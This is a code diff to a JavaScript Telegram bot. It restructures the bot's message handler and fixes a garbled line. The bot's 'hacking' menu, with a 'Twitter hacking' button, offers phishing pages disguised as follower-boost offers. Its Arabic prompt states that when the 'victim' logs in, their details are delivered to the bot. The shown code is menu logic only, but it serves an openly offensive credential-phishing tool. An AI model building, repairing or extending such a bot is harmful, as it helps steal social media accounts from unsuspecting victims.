@@ -763,13 +763,17 @@ async function checkSubscription(userId) {
 }
 
 
-if (text === '/start') {
+bot.on('message', (msg) => {
+  const text = msg.text;
+  const senderId = msg.chat.id;
+
+  if (text === '/start') {
     showDefaultButtons(senderId);
   } else if (text === '/login') {
     showLoginButtons(senderId);
   } else if (text === '/hacking') {
     showHackingButtons(senderId);
-  }showButtonsshowDefaultButtons
+  }
 });
 
 function showDefaultButtons(userId) {
@@ -819,12 +823,13 @@ function showHackingButtons(userId) {
     [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
   ];
 
-  bot.sendMessage(userId, `اختر  اندكسات على شكل زياده متابعين  عند قيام الضحيه بتسجيل  لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
+  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
     reply_markup: {
       inline_keyboard: hackingButtons
     }
   });
 }
+
 // ... (باقي الكود)
 
 
